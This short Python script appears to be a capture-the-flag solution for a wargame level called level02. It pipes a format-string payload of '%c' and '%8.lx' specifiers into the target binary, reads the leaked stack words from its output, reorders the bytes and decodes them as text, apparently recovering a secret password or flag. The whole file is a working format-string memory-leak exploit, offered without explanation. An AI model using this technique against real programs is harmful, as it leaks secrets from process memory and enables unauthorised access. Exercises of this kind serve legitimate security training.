import binascii
import os

def divide(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

stream = os.popen('echo ' + '%c'*21 + '%8.lx'*5 + ' | /home/users/level02/level02')
for i in range(6):
        output = stream.readline()
input_string = output[21:101:]
parts = divide(input_string, 16)
stringrev = ''.join(''.join(divide(part, 2)[::-1]) for part in parts)
print(binascii.unhexlify(stringrev).decode('utf-8'))